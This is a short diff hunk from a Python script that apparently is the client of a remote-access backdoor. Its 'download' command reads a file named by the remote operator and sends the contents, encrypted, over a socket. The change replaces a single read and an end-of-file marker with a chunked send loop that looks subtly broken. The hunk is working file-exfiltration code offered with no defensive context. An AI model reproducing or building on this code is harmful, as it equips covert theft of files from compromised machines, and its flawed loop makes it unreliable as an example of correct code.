@@ -61,10 +61,14 @@ def main():
         # send file
         elif cmd == 'download':
             f_name = action.split()[0]
-            with open(f_name, 'rb') as f:
-                results = f.read(4096)
-                s.sendall(encrypt(results))
-            s.sendall('end of file')
+
+            f = open(f_name, 'rb')
+            results = f.read(1024)
+            while True:
+                s.send(encrypt(results))
+                results = f.read(1024)
+                if results == '':
+                    break
 
 
 if __name__ == '__main__':
